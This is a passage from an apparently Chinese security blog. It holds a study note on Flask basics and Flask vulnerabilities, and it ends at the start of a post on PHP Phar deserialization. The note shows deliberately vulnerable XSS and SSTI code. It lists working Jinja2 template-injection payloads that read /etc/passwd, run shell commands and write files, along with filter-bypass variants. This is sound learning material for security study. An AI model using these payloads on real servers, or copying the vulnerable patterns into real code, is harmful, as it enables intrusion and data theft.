        <content type="html"><![CDATA[<h1 id="Flask是什么？"><a href="#Flask是什么？" class="headerlink" title="Flask是什么？"></a>Flask是什么？</h1><p>Flask是一个相对于<code>Django</code>而言<em>轻量级</em>的Web框架，是Python开发的一个基于<code>Werkzeug</code>和<code>Jinja 2</code>的web开发微框架，它的优势是极其简洁，但又非常灵活，而且容易学习和应用。因此Flask框架是Python新手快速开始web开发最好的选择，此外，使用Flask框架的另一个好处在于你可以非常轻松地将基于Python的机器学习算法或数据分析算法集成到web应用中。</p><blockquote><p>Django:Python下有许多款不同的 Web 框架。Django是重量级选手中最有代表性的一位。许多成功的网站和APP都基于Django。</p><p>Werkzeug:Werkzeug是Python的<code>WSGI</code>规范的实用函数库。</p><p>WSGI：是为 Python 语言定义的 Web 服务器和 Web 应用程序或框架之间的一种简单而通用的接口。自从 <code>WSGI</code> 被开发出来以后，许多其它语言中也出现了类似接口。我们不希望接触到TCP连接、HTTP原始请求和响应格式，所以，需要一个统一的接口，让我们专心用Python编写Web业务。这个接口就是<code>WSGI</code>：Web Server Gateway Interface。</p><p>Jinja 2:Jinja2是Python下一个被广泛应用的<code>模版引擎</code>，功能比较类似于于PHP的<code>smarty</code></p><p>模板引擎（这里特指用于Web开发的模板引擎 ）：为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的HTML文档。</p></blockquote><h1 id="Flask基操"><a href="#Flask基操" class="headerlink" title="Flask基操"></a>Flask基操</h1><h2 id="安装Flask"><a href="#安装Flask" class="headerlink" title="安装Flask"></a>安装Flask</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install flask</span><br></pre></td></tr></table></figure><h2 id="编写Hello-Flask"><a href="#编写Hello-Flask" class="headerlink" title="编写Hello,Flask!"></a>编写Hello,Flask!</h2><ol><li>引入Flask类</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br></pre></td></tr></table></figure><ol start="2"><li>创建Flask对象，我们将使用该对象进行应用的配置和运行：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app = Flask(__name__)</span><br></pre></td></tr></table></figure><p><code>___name__</code>是Python中的特殊变量，如果文件作为主程序执行，那么<code>__name__</code>变量的值就是<code>__main__</code>，如果是被其他模块引入，那么<code>__name__</code>的值就是模块名称。</p><ol start="3"><li>编写主程序</li></ol><p>在主程序中，执行<code>run()</code>来启动应用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure><p>改名启动一个本地服务器，默认情况下其地址是<code>localhost:5000</code>，在上面的代码中，我们使用关键字参数<code>port</code>将监听端口修改为8080。</p><ol start="4"><li>路由</li></ol><p>使用app变量的<code>route()</code>装饰器来告诉Flask框架URL如何触发我们的视图函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello, Flask!&#x27;</span></span><br></pre></td></tr></table></figure><p>上面的标识，对路径’/‘的请求，将转为对<code>hello_world()</code>函数的调用。</p><p><img src="/post/2021-10/Flask%E6%A1%86%E6%9E%B6%E5%8F%8A%E5%85%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/202112071357216.png" alt="image-20210914205338833"></p><h2 id="使用HTML模板"><a href="#使用HTML模板" class="headerlink" title="使用HTML模板"></a>使用HTML模板</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/greet&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">greet</span>():</span></span><br><span class="line">    user = &#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;ggbond&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="string">&#x27;18&#x27;</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">    &lt;head&gt;</span></span><br><span class="line"><span class="string">        &lt;title&gt;Templating&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;/head&gt;</span></span><br><span class="line"><span class="string">    &lt;body&gt;</span></span><br><span class="line"><span class="string">        Hello, &lt;b&gt;&#x27;&#x27;&#x27;</span> + user[<span class="string">&#x27;username&#x27;</span>] + <span class="string">&#x27;&#x27;&#x27;&lt;/b&gt;!, you’re &lt;b&gt;&#x27;&#x27;&#x27;</span> + user[<span class="string">&#x27;age&#x27;</span>] + <span class="string">&#x27;&#x27;&#x27;&lt;/b&gt; years old.</span></span><br><span class="line"><span class="string">    &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, port=<span class="number">8080</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/post/2021-10/Flask%E6%A1%86%E6%9E%B6%E5%8F%8A%E5%85%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/202112071357218.png" alt="image-20210914205413958"></p><p>拼接HTML字符串非常容易出错，因此Flask使用Jinja 2模板引擎来分离数据逻辑和展示层。</p><p>使用模板时，视图函数应当返回<code>render_template()</code>的调用结果。例如下面的代码片段渲染模板<code>index.html</code>，并将渲染结果作为视图函数的返回值：</p><p>我们将模板文件按如下路径放置：<br>app.py<br>templates<br>   |-/index.html</p><p>app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span>():</span></span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, name=name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, port=<span class="number">8080</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>index.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    &#123;% if name %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Hello &#123;&#123; name &#125;&#125;.<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    &#123;% else %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Hello.<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/post/2021-10/Flask%E6%A1%86%E6%9E%B6%E5%8F%8A%E5%85%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/202112071357219.png" alt="image-20210914205507819"></p><h1 id="Flask框架漏洞"><a href="#Flask框架漏洞" class="headerlink" title="Flask框架漏洞"></a>Flask框架漏洞</h1><p>flask使用Jinja作为模板语言，模板应该放在myapp/templates/——一个在应用文件夹里面的目录。Jinja有两种定界符：<code>&#123;% ... %&#125;</code>和<code>&#123;&#123; ... &#125;&#125;</code>。前者用于执行类似循环或赋值的语句，后者向模板输出表达式求值的结果。</p><h2 id="flask导致XSS漏洞"><a href="#flask导致XSS漏洞" class="headerlink" title="flask导致XSS漏洞"></a>flask导致XSS漏洞</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    code = request.args.get(<span class="string">&#x27;test&#x27;</span>)</span><br><span class="line">    html = <span class="string">&#x27;&lt;html&gt;%s&lt;/html&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> html % code</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure><p><img src="/post/2021-10/Flask%E6%A1%86%E6%9E%B6%E5%8F%8A%E5%85%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/202112071357220.png" alt="image-20210914205827157"></p><blockquote><p>为了避免XSS，可以使用render_tempplate_string对输入的文本进行渲染。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    code = request.args.get(<span class="string">&#x27;test&#x27;</span>)</span><br><span class="line">    html = <span class="string">&#x27;&lt;html&gt;&#123;&#123;var&#125;&#125;&lt;/html&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(html, var=code)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure><p><img src="/post/2021-10/Flask%E6%A1%86%E6%9E%B6%E5%8F%8A%E5%85%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/202112071357221.png" alt="image-20210914210037860"></p><h2 id="SSTI漏洞"><a href="#SSTI漏洞" class="headerlink" title="SSTI漏洞"></a>SSTI漏洞</h2><blockquote><p>SSTI(Server-Side Template Injection) 服务端模板注入</p><p>服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分。通过模板，Web应用可以把输入转换成特定的HTML格式。在进行目标编译渲染的过程中，若用户插入了相关恶意内容，结果可能导致了敏感信息泄露、代码执行、GetShell 等问题。</p></blockquote><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><ul><li>在jinja2中，存在三种语句：控制结构<code> &#123;% %&#125;</code>、变量取值<code> &#123;&#123; &#125;&#125;</code>、注释 ``。</li><li>jinja2模板中使用 <code>&#123;&#123; &#125;&#125;</code> 语法表示一个变量，它是一种特殊的占位符。当利用jinja2进行渲染的时候，它会把这些特殊的占位符进行填充/替换，jinja2支持python中所有的Python数据类型比如列表、字段、对象等。</li><li>在Jinja2引擎中，<code>&#123;&#123;&#125;&#125;</code>不仅仅是<code>变量标示符</code>，也能执行一些简单的<code>表达式</code>。</li><li>模板只是一种提供给程序来解析的一种语法，换句话说，模板是用于从数据（变量）到实际的视觉表现（HTML代码）这项工作的一种实现手段，而这种手段不论在前端还是后端都有应用。</li></ul><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>将参数当字符串来渲染并且使用了<code>% request.args.get()</code>导致模版渲染可控。如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    code = request.args.get(<span class="string">&#x27;test&#x27;</span>)</span><br><span class="line">    template = <span class="string">&#x27;&lt;html&gt;%s&lt;/html&gt;&#x27;</span> % code</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, port=<span class="number">8080</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/post/2021-10/Flask%E6%A1%86%E6%9E%B6%E5%8F%8A%E5%85%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/202112071357222.png" alt="image-20210914211657582"></p><p>漏洞代码使用了<code>render_template_string</code>函数，而如果使用<code>render_template</code>函数，将变量传入进去，经过<code>固定模版的渲染</code>便不可控了。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><blockquote><p>在python中，object类是Python中所有类的基类，如果定义一个类时没有指定继承哪个类，则默认继承object类。</p></blockquote><p><strong>利用思路</strong>：找到父类&lt;type ‘object’&gt;–&gt;寻找子类 <strong>subclasses</strong>()–&gt;找关于命令执行或者文件操作的模块</p><blockquote><p>构造继承链的思路是<br>1）随便找一个内置类对象用class拿到他所对应的类<br>2）用bases拿到基类（&lt;class ‘object’&gt;）<br>3）用subclasses()拿到子类列表<br>在子类列表中直接寻找可以利用的类。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、获取’‘的类对象：<span class="string">&#x27;&#x27;</span>.<span class="keyword">__class__</span></span><br><span class="line"><span class="number">2</span>、追溯继承树：<span class="string">&#x27;&#x27;</span>.<span class="keyword">__class__</span>.__mro__</span><br><span class="line"><span class="number">3</span>、可以看到<span class="keyword">object</span>已经出来了，然后继续向下查找<span class="keyword">object</span>的子类：<span class="string">&#x27;&#x27;</span>.<span class="keyword">__class__</span>.__mro__[<span class="number">2</span>].__subclasses__()</span><br><span class="line"><span class="number">4</span>、找到可执行命令或者读文件的方法，找到第<span class="number">40</span>个为&lt;type&gt; <span class="string">&#x27;file&#x27;</span>，执行命令：<span class="string">&#x27;&#x27;</span>.<span class="keyword">__class__</span>.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br></pre></td></tr></table></figure><p><strong>常用payload</strong>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">python3</span><br><span class="line">- 文件读取：&#123;&#123;().<span class="keyword">__class__</span>.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">177</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;open&#x27;</span>](<span class="string">&#x27;file&#x27;</span>).read()&#125;&#125;</span><br><span class="line">- 命令执行：&#123;&#123; config.<span class="keyword">__class__</span>.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read() &#125;&#125;</span><br><span class="line">- 命令执行：&#123;&#123;lipsum.__globals__.__getitem__[<span class="string">&quot;os&quot;</span>].popen(<span class="string">&quot;whoami&quot;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">python2</span><br><span class="line">- 文件读取：&#123;&#123;<span class="string">&#x27;&#x27;</span>.<span class="keyword">__class__</span>.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;</span><br><span class="line">- 文件读取：().\_\_class__.\_\_bases\_\_[<span class="number">0</span>].\_\_subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).readlines</span><br><span class="line">- 文件读取：&#123;&#123;().<span class="keyword">__class__</span>.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;open&#x27;</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;  </span><br><span class="line">- 写文件：&#123;&#123; <span class="string">&#x27;&#x27;</span>.<span class="keyword">__class__</span>.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/tmp/1&#x27;</span>).write(<span class="string">&quot;&quot;</span>) &#125;&#125;</span><br><span class="line">- 命令执行：&#123;&#123;<span class="string">&#x27;&#x27;</span>.<span class="keyword">__class__</span>.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span></span><br><span class="line">- 命令执行：&#123;&#123;<span class="string">&#x27;&#x27;</span>.<span class="keyword">__class__</span>.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/tmp/owned.cfg&#x27;</span>,<span class="string">&#x27;w&#x27;</span>).write(<span class="string">&#x27;code&#x27;</span>)&#125;&#125;  </span><br><span class="line">&#123;&#123; config.from_pyfile(<span class="string">&#x27;/tmp/owned.cfg&#x27;</span>) &#125;&#125; </span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">python2、python3共有，可命令执行：</span><br><span class="line">&#123;% <span class="keyword">for</span> c in ().<span class="keyword">__class__</span>.__bases__[<span class="number">0</span>].__subclasses__(): %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;_IterationGuard&#x27;</span>: %&#125;</span><br><span class="line">&#123;&#123;c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>) &#125;&#125;</span><br><span class="line">&#123;% <span class="keyword">endif</span> %&#125;</span><br><span class="line">&#123;% <span class="keyword">endfor</span> %&#125;</span><br></pre></td></tr></table></figure><p><strong>一些绕过</strong>：</p><p>（1）过滤[]等括号</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">使用gititem绕过。如原poc &#123;&#123;<span class="string">&quot;&quot;</span>.<span class="keyword">class</span>.bases[<span class="number">0</span>]&#125;&#125;</span><br><span class="line">绕过后&#123;&#123;<span class="string">&quot;&quot;</span>.<span class="keyword">class</span>.bases.getitem(<span class="number">0</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p>（2）过滤了subclasses，拼凑法</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原poc&#123;&#123;<span class="string">&quot;&quot;</span>.<span class="keyword">class</span>.bases[<span class="number">0</span>].subclasses()&#125;&#125;</span><br><span class="line">绕过 &#123;&#123;<span class="string">&quot;&quot;</span>.<span class="keyword">class</span>.bases[<span class="number">0</span>][<span class="string">&#x27;subcla&#x27;</span>+<span class="string">&#x27;sses&#x27;</span>]&#125;&#125;</span><br></pre></td></tr></table></figure><p>（3）过滤class，使用session</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">poc &#123;&#123;session[<span class="string">&#x27;cla&#x27;</span>+<span class="string">&#x27;ss&#x27;</span>].bases[<span class="number">0</span>].bases[<span class="number">0</span>].bases[<span class="number">0</span>].bases[<span class="number">0</span>].subclasses()[<span class="number">118</span>]&#125;&#125;</span><br><span class="line">多个bases[<span class="number">0</span>]是因为一直在向上找<span class="built_in">object</span>类。使用mro就会很方便</span><br><span class="line">&#123;&#123;session[<span class="string">&#x27;__cla&#x27;</span>+<span class="string">&#x27;ss__&#x27;</span>].__mro__[<span class="number">12</span>]&#125;&#125;</span><br><span class="line">或者</span><br><span class="line">request[<span class="string">&#x27;__cl&#x27;</span>+<span class="string">&#x27;ass__&#x27;</span>].__mro__[<span class="number">12</span>]&#125;&#125;</span><br></pre></td></tr></table></figure><p>（4）timeit姿势</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> timeit</span><br><span class="line">timeit.timeit(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;dir&#x27;)&quot;</span>,number<span class="operator">=</span><span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> platform</span><br><span class="line">print platform.popen(&#x27;dir&#x27;).read()</span><br></pre></td></tr></table></figure><p><strong>特殊：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;get_flashed_messages&#125;&#125;</span><br><span class="line">&#123;&#123;url_for&#125;&#125;</span><br><span class="line">&#123;&#123;%<span class="built_in">print</span>(lipsum|attr(<span class="string">&quot;__globals__“))|attr(&quot;</span>__getitem__<span class="string">&quot;)(&quot;</span>os<span class="string">&quot;)|attr(&quot;</span>popen<span class="string">&quot;)(&quot;</span>whoami<span class="string">&quot;)|attr(”read“)()%&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>使用<code>attr</code>过滤器，对应 <code>do_attr</code></p><p>即用来获取类的属性 由<code>getattr</code>函数来实现<code>&#123;&#123;config|attr("__class__")&#125;&#125;</code></p><p><code>__getitem__</code>方法返回键对应值，<code>attr</code>过滤器获得类属性</p><p><strong>参考文章：</strong></p><p><a href="https://www.jianshu.com/p/56614e46093e">flask框架漏洞</a></p><p><a href="https://segmentfault.com/a/1190000017330435">Python Flask框架：零基础web开发入门教程</a></p><p><a href="https://www.freebuf.com/articles/web/260504.html">Flask框架（jinja2）服务端模板注入漏洞分析（SSTI）</a></p><p><a href="https://www.cnblogs.com/Rasang/p/12181654.html">Python——flask漏洞探究</a><a href="https://www.cnblogs.com/Rasang/p/12181654.html">https://www.cnblogs.com/Rasang/p/12181654.html</a>)</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Phar反序列化漏洞</title>
      <link href="/post/2021-10/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
      <url>/post/2021-10/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>通常我们在利用反序列化漏洞的时候，只能将序列化后的字符串传入 unserialize() ，随着代码安全性越来越高，利用难度也越来越大。但是利用 phar 文件会以反序列化的形式存储用户自定义的 meta-data 这一特征，拓展了 php 反序列化漏洞的攻击面。该方法在文件系统函数(file_exists()、is_dir()等)参数可控的情况下，配合 <code>phar://</code> 协议，可以不依赖 unserialize() 直接进行反序列化操作。</p><h1 id="Phar反序列化漏洞的原理"><a href="#Phar反序列化漏洞的原理" class="headerlink" title="Phar反序列化漏洞的原理"></a>Phar反序列化漏洞的原理</h1><h2 id="什么是Phar？"><a href="#什么是Phar？" class="headerlink" title="什么是Phar？"></a>什么是Phar？</h2><p>Phar(“Php ARchive”) 是PHP 里类似于 JAR 的一种打包文件，在 PHP 5.3 或更高版本中默认开启，这个特征使得 PHP 也可以像 Java 一样方便地实现应用程序打包和组件化。一个应用程序可以打包一个Phar 包， 直接放到 <code>PHP-FPM</code> 中运行。</p><h2 id="PHP内置的流包装器"><a href="#PHP内置的流包装器" class="headerlink" title="PHP内置的流包装器"></a>PHP内置的流包装器</h2><p>php 通过用户定义和内置的“流包装器”实现复杂的文件处理功能。内置包装器可用于文件系统函数。如(fopen(),copy(),file_exists()和filesize())。 <code>phar://</code>就是一种内置的流包装器</p><blockquote><p>file:// — 访问本地文件系统，在用文件系统函数时默认就使用该包装器<br>http:// — 访问 HTTP(s) 网址<br>ftp:// — 访问 FTP(s) URLs<br>php:// — 访问各个输入/输出流（I/O streams）<br>zlib:// — 压缩流<br>data:// — 数据（RFC 2397）<br>glob:// — 查找匹配的文件路径模式<br>phar:// — PHP 归档<br>ssh2:// — Secure Shell 2<br>rar:// — RAR<br>ogg:// — 音频流<br>expect:// — 处理交互式的流</p></blockquote><p><a href="https://www.php.net/manual/zh/wrappers.php">php支持的协议和包装器</a></p><h2 id="Phar文件结构"><a href="#Phar文件结构" class="headerlink" title="Phar文件结构"></a>Phar文件结构</h2><ol><li>a stub</li></ol><p>可以理解为一个标志，格式为<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>，前面的xxx内容不限，但必须是以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。</p><ol start="2"><li>a manifest describing the contents、</li></ol><p>Phar文件中被压缩的文件的一些信息，其中<code>Meta-data</code>部分的信息会以序列化的形式储存，这里就是漏洞利用的关键点</p><p><img 